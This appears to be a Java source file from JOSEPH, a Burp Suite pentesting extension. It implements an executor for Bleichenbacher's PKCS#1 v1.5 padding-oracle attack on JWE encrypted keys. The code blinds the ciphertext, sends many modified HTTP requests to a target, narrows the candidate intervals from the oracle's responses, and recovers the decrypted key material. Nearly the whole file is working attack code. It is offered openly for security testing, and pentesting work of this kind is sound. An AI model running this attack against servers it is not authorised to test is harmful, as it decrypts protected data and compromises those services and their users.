/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 * <p>
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * <p>
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks.BleichenbacherPkcs1;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IHttpService;
import eu.dety.burp.joseph.attacks.BleichenbacherPkcs1.gui.BleichenbacherPkcs1DecryptionAttackPanel;
import eu.dety.burp.joseph.utilities.Decoder;
import eu.dety.burp.joseph.utilities.JoseParameter;
import eu.dety.burp.joseph.utilities.Logger;
import org.apache.commons.codec.binary.Base64;

import javax.swing.*;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.List;

/**
 * Algorithm code heavily based on the WS-Attacker
 * @see <a href="https://github.com/RUB-NDS/WS-Attacker">https://github.com/RUB-NDS/WS-Attacker</a>
 */

/**
 * Decryption Attack Executor
 * <p>
 * Performs the actual request and updates related widgets
 */
class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, BigInteger> {
    private static final Logger loggerInstance = Logger.getInstance();

    private BleichenbacherPkcs1DecryptionAttackPanel panelReference;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private JoseParameter parameter;

    private boolean msgIsPkcs = true;
    private BigInteger c0;
    private BigInteger s0;
    private BigInteger si;
    private Interval[] m;
    private int blockSize;
    private BigInteger bigB;
    private byte[] result = {};
    private BleichenbacherPkcs1Oracle oracle;
    private RSAPublicKey pubKey;
    private IHttpService httpService;
    private byte[] encryptedKey;
    private int amountRequests = 0;

    BleichenbacherPkcs1DecryptionAttackExecutor(BleichenbacherPkcs1DecryptionAttackPanel panelReference, IBurpExtenderCallbacks callbacks, RSAPublicKey pubKey,
            IHttpRequestResponse requestResponse, JoseParameter parameter, BleichenbacherPkcs1Oracle oracle, boolean msgIsPkcs) {
        this.panelReference = panelReference;
        this.requestResponse = requestResponse;
        this.parameter = parameter;
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.oracle = oracle;
        this.pubKey = pubKey;
        this.msgIsPkcs = msgIsPkcs;
    }

    @Override
    // Fire prepared request and return responses as IHttpRequestResponse
    protected Integer doInBackground() throws Exception {
        int i = 0;
        boolean solutionFound = false;

        this.c0 = BigInteger.ZERO;
        this.si = BigInteger.ZERO;
        this.m = null;
        this.blockSize = this.pubKey.getModulus().bitLength() / 8;

        this.httpService = this.requestResponse.getHttpService();

        // b computation
        int tmp = this.pubKey.getModulus().bitLength();
        while (tmp % 8 != 0) {
            tmp++;
        }
        tmp = ((tmp / 8) - 2) * 8;
        this.bigB = BigInteger.valueOf(2).pow(tmp);

        loggerInstance.log(getClass(), "B computed: " + this.bigB.toString(16), Logger.LogLevel.INFO);
        loggerInstance.log(getClass(), "Blocksize: " + blockSize + " bytes", Logger.LogLevel.INFO);

        String[] components = Decoder.getComponents(this.parameter.getJoseValue());

        encryptedKey = Base64.decodeBase64(components[1]);

        loggerInstance.log(getClass(), "Step 1: Blinding", Logger.LogLevel.INFO);

        if (this.msgIsPkcs) {
            loggerInstance.log(getClass(), "Step skipped --> " + "Message is considered as PKCS compliant.", Logger.LogLevel.INFO);
            this.s0 = BigInteger.ONE;
            this.c0 = new BigInteger(1, this.encryptedKey);
            this.m = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(this.bigB),
                    (BigInteger.valueOf(3).multiply(this.bigB)).subtract(BigInteger.ONE)) };
        } else {
            stepOne();
        }

        i++;

        while (!solutionFound) {
            // Check if user has cancelled the worker
            if (isCancelled()) {
                loggerInstance.log(getClass(), "Decryption Attack Executor Worker cancelled by user", Logger.LogLevel.INFO);
                return 0;
            }

            loggerInstance.log(getClass(), "Step 2: Searching for PKCS conforming messages.", Logger.LogLevel.INFO);
            try {
                stepTwo(i);
            } catch (Exception e) {
                loggerInstance.log(getClass(), "Error in stepTwo: " + e.getMessage(), Logger.LogLevel.INFO);
            }

            loggerInstance.log(getClass(), "Step 3: Narrowing the set of soultions.", Logger.LogLevel.INFO);
            stepThree(i);

            loggerInstance.log(getClass(), "Step 4: Computing the solution.", Logger.LogLevel.INFO);
            solutionFound = stepFour();
            i++;
        }

        return 1;
    }

    @Override
    protected void process(List<BigInteger> chunks) {
        if (!this.isCancelled()) {
            for (BigInteger s : chunks) {
                this.panelReference.setCurrentSValue(s);
            }
        }
    }

    @Override
    protected void done() {
        this.panelReference.attackDoneAction(this.result, this.parameter);
    }

    private void updateAmountRequest() {
        this.amountRequests++;
        this.panelReference.setAmountRequestsValue(this.amountRequests);
    }

    private void stepOne() throws Exception {
        byte[] send;
        IHttpRequestResponse response;
        byte[] request;

        BigInteger ciphered = new BigInteger(1, this.encryptedKey);

        do {
            // Check if user has cancelled the worker
            if (isCancelled()) {
                loggerInstance.log(getClass(), "Decryption Attack Executor Worker cancelled by user", Logger.LogLevel.INFO);
                return;
            }

            this.si = this.si.add(BigInteger.ONE);
            send = prepareMsg(ciphered, this.si);

            request = this.requestResponse.getRequest();
            String[] components = Decoder.getComponents(this.parameter.getJoseValue());
            components[1] = Decoder.base64UrlEncode(send);

            String newComponentsConcatenated = Decoder.concatComponents(components);

            request = JoseParameter.updateRequest(request, this.parameter, helpers, newComponentsConcatenated);

            response = callbacks.makeHttpRequest(this.httpService, request);
            updateAmountRequest();

        } while (oracle.getResult(response.getResponse()) != BleichenbacherPkcs1Oracle.Result.VALID);

        this.c0 = new BigInteger(1, send);
        this.s0 = this.si;
        // mi = {[2B,3B-1]}
        this.m = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB), (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };

        loggerInstance.log(getClass(), "Found s0 : " + this.si, Logger.LogLevel.INFO);
    }

    private void stepTwo(final int i) throws Exception {
        if (i == 1) {
            this.stepTwoA();
        } else {
            if (i > 1 && this.m.length >= 2) {
                stepTwoB();
            } else if (this.m.length == 1) {
                stepTwoC();
            }
        }

        loggerInstance.log(getClass(), " Found s" + i + ": " + this.si, Logger.LogLevel.INFO);

        publish(this.si);
    }

    private void stepTwoA() throws Exception {
        byte[] send;
        BigInteger n = this.pubKey.getModulus();

        loggerInstance.log(getClass(), "Step 2a: Starting the search", Logger.LogLevel.INFO);

        // si = ceil(n/(3B))
        BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
            this.si = tmp[0].add(BigInteger.ONE);
        } else {
            this.si = tmp[0];
        }

        // correction will be done in do while
        this.si = this.si.subtract(BigInteger.ONE);

        IHttpRequestResponse response;
        byte[] request;

        do {
            // Check if user has cancelled the worker
            if (isCancelled()) {
                loggerInstance.log(getClass(), "Decryption Attack Executor Worker cancelled by user", Logger.LogLevel.INFO);
                return;
            }

            this.si = this.si.add(BigInteger.ONE);
            send = prepareMsg(this.c0, this.si);

            request = this.requestResponse.getRequest();
            String[] components = Decoder.getComponents(this.parameter.getJoseValue());
            components[1] = Decoder.base64UrlEncode(send);

            String newComponentsConcatenated = Decoder.concatComponents(components);

            request = JoseParameter.updateRequest(request, this.parameter, helpers, newComponentsConcatenated);

            response = callbacks.makeHttpRequest(this.httpService, request);
            updateAmountRequest();

        } while (oracle.getResult(response.getResponse()) != BleichenbacherPkcs1Oracle.Result.VALID);
        loggerInstance.log(getClass(), "Matching response: " + helpers.bytesToString(response.getResponse()), Logger.LogLevel.DEBUG);
    }

    private void stepTwoB() throws Exception {
        byte[] send;
        IHttpRequestResponse response;
        byte[] request;

        loggerInstance.log(getClass(), "Step 2b: Searching with more than" + " one interval left", Logger.LogLevel.INFO);

        do {
            // Check if user has cancelled the worker
            if (isCancelled()) {
                loggerInstance.log(getClass(), "Decryption Attack Executor Worker cancelled by user", Logger.LogLevel.INFO);
                return;
            }

            this.si = this.si.add(BigInteger.ONE);
            send = prepareMsg(this.c0, this.si);

            request = this.requestResponse.getRequest();
            String[] components = Decoder.getComponents(this.parameter.getJoseValue());
            components[1] = Decoder.base64UrlEncode(send);

            String newComponentsConcatenated = Decoder.concatComponents(components);

            request = JoseParameter.updateRequest(request, this.parameter, helpers, newComponentsConcatenated);

            response = callbacks.makeHttpRequest(this.httpService, request);
            updateAmountRequest();

        } while (oracle.getResult(response.getResponse()) != BleichenbacherPkcs1Oracle.Result.VALID);
        loggerInstance.log(getClass(), "Matching response: " + helpers.bytesToString(response.getResponse()), Logger.LogLevel.DEBUG);
    }

    private void stepTwoC() throws Exception {
        byte[] send;
        IHttpRequestResponse response;
        byte[] request;

        BigInteger n = this.pubKey.getModulus();

        loggerInstance.log(getClass(), "Step 2c: Searching with one interval left", Logger.LogLevel.INFO);

        // initial ri computation - ri = 2(b*(si-1)-2*B)/n
        BigInteger ri = this.si.multiply(this.m[0].upper);
        ri = ri.subtract(BigInteger.valueOf(2).multiply(this.bigB));
        ri = ri.multiply(BigInteger.valueOf(2));
        ri = ri.divide(n);

        // initial si computation
        BigInteger upperBound = step2cComputeUpperBound(ri, n, this.m[0].lower);
        BigInteger lowerBound = step2cComputeLowerBound(ri, n, this.m[0].upper);

        // to counter .add operation in do while
        this.si = lowerBound.subtract(BigInteger.ONE);

        do {
            // Check if user has cancelled the worker
            if (isCancelled()) {
                loggerInstance.log(getClass(), "Decryption Attack Executor Worker cancelled by user", Logger.LogLevel.INFO);
                return;
            }

            this.si = this.si.add(BigInteger.ONE);
            // lowerBound <= si < upperBound
            if (this.si.compareTo(upperBound) > 0) {
                // new values
                ri = ri.add(BigInteger.ONE);
                upperBound = step2cComputeUpperBound(ri, n, this.m[0].lower);
                lowerBound = step2cComputeLowerBound(ri, n, this.m[0].upper);
                this.si = lowerBound;
            }
            send = prepareMsg(this.c0, this.si);

            request = this.requestResponse.getRequest();
            String[] components = Decoder.getComponents(this.parameter.getJoseValue());
            components[1] = Decoder.base64UrlEncode(send);

            String newComponentsConcatenated = Decoder.concatComponents(components);

            request = JoseParameter.updateRequest(request, this.parameter, helpers, newComponentsConcatenated);

            response = callbacks.makeHttpRequest(this.httpService, request);
            updateAmountRequest();

        } while (oracle.getResult(response.getResponse()) != BleichenbacherPkcs1Oracle.Result.VALID);
        loggerInstance.log(getClass(), "Matching response: " + helpers.bytesToString(response.getResponse()), Logger.LogLevel.DEBUG);
    }

    private BigInteger step2cComputeLowerBound(final BigInteger r, final BigInteger modulus, final BigInteger upperIntervalBound) {
        BigInteger lowerBound = BigInteger.valueOf(2).multiply(this.bigB);
        lowerBound = lowerBound.add(r.multiply(modulus));
        lowerBound = lowerBound.divide(upperIntervalBound);

        return lowerBound;
    }

    private BigInteger step2cComputeUpperBound(final BigInteger r, final BigInteger modulus, final BigInteger lowerIntervalBound) {
        BigInteger upperBound = BigInteger.valueOf(3).multiply(this.bigB);
        upperBound = upperBound.add(r.multiply(modulus));
        upperBound = upperBound.divide(lowerIntervalBound);

        return upperBound;
    }

    private void stepThree(final int i) throws Exception {
        BigInteger n = this.pubKey.getModulus();
        BigInteger r;
        BigInteger upperBound;
        BigInteger lowerBound;
        BigInteger max;
        BigInteger min;
        BigInteger[] tmp;
        ArrayList<Interval> ms = new ArrayList<>(15);

        for (Interval interval : this.m) {
            upperBound = step3ComputeUpperBound(this.si, n, interval.upper);
            lowerBound = step3ComputeLowerBound(this.si, n, interval.lower);

            r = lowerBound;
            // lowerBound <= r <= upperBound
            while (r.compareTo(upperBound) < 1) {
                // ceil((2*B+r*n)/si)
                max = (BigInteger.valueOf(2).multiply(this.bigB)).add(r.multiply(n));
                tmp = max.divideAndRemainder(this.si);
                if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
                    max = tmp[0].add(BigInteger.ONE);
                } else {
                    max = tmp[0];
                }

                // floor((3*B-1+r*n)/si
                min = BigInteger.valueOf(3).multiply(this.bigB);
                min = min.subtract(BigInteger.ONE);
                min = min.add(r.multiply(n));
                min = min.divide(this.si);

                // build new interval
                if (interval.lower.compareTo(max) > 0) {
                    max = interval.lower;
                }
                if (interval.upper.compareTo(min) < 0) {
                    min = interval.upper;
                }
                if (max.compareTo(min) <= 0) {
                    ms.add(new Interval(max, min));
                }
                // one further....
                r = r.add(BigInteger.ONE);
            }
        }

        loggerInstance.log(getClass(), " # of intervals for M" + i + ": " + ms.size(), Logger.LogLevel.INFO);

        if (ms.size() == 0) {
            throw new Exception("Zero intervals left, validity oracle seems to be wrong!");
        }

        this.m = ms.toArray(new Interval[ms.size()]);
    }

    private BigInteger step3ComputeUpperBound(final BigInteger s, final BigInteger modulus, final BigInteger upperIntervalBound) {
        BigInteger upperBound = upperIntervalBound.multiply(s);
        upperBound = upperBound.subtract(BigInteger.valueOf(2).multiply(bigB));
        // ceil
        BigInteger[] tmp = upperBound.divideAndRemainder(modulus);
        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
            upperBound = BigInteger.ONE.add(tmp[0]);
        } else {
            upperBound = tmp[0];
        }

        return upperBound;
    }

    private BigInteger step3ComputeLowerBound(final BigInteger s, final BigInteger modulus, final BigInteger lowerIntervalBound) {
        BigInteger lowerBound = lowerIntervalBound.multiply(s);
        lowerBound = lowerBound.subtract(BigInteger.valueOf(3).multiply(this.bigB));
        lowerBound = lowerBound.add(BigInteger.ONE);
        lowerBound = lowerBound.divide(modulus);

        return lowerBound;
    }

    private boolean stepFour() {
        boolean resultFound = false;

        if (this.m.length == 1 && this.m[0].lower.compareTo(this.m[0].upper) == 0) {
            BigInteger solution = this.s0.modInverse(this.pubKey.getModulus());
            solution = solution.multiply(this.m[0].upper).mod(this.pubKey.getModulus());

            publish(solution);

            this.result = solution.toByteArray();
            loggerInstance.log(getClass(), "====> Solution found!\n" + solution, Logger.LogLevel.INFO);

            resultFound = true;
        }

        return resultFound;
    }

    /**
     * @param originalMessage
     *            original message to be changed
     * @param si
     *            factor
     * @return Prepared message as byte array
     */
    private byte[] prepareMsg(final BigInteger originalMessage, final BigInteger si) {
        byte[] msg;
        BigInteger tmp;

        // encrypt: si^e mod n
        tmp = si.modPow(this.pubKey.getPublicExponent(), this.pubKey.getModulus());

        // blind: c0*(si^e) mod n
        // or: m*si mod n (in case of plaintext m_Oracle)
        tmp = originalMessage.multiply(tmp);
        tmp = tmp.mod(this.pubKey.getModulus());
        // get bytes
        msg = correctSize(tmp.toByteArray(), this.blockSize, true);

        return msg;
    }

    /**
     * Corrects the length of a byte array to a multiple of a passed blockSize.
     * 
     * @param array
     *            Array which size should be corrected
     * @param blockSize
     *            Blocksize - the resulting array length will be a multiple of it
     * @param removeSignByte
     *            If set to TRUE leading sign bytes will be removed
     * @return Size corrected array (maybe padded or stripped the sign byte)
     */
    private static byte[] correctSize(final byte[] array, final int blockSize, final boolean removeSignByte) {
        int remainder = array.length % blockSize;
        byte[] result = array;
        byte[] tmp;

        if (removeSignByte && remainder > 0 && result[0] == 0x0) {
            // extract signing byte if present
            tmp = new byte[result.length - 1];
            System.arraycopy(result, 1, tmp, 0, tmp.length);
            result = tmp;
            remainder = tmp.length % blockSize;
        }

        if (remainder > 0) {
            // add zeros to fit size
            tmp = new byte[result.length + blockSize - remainder];
            System.arraycopy(result, 0, tmp, blockSize - remainder, result.length);
            result = tmp;
        }

        return result;
    }

}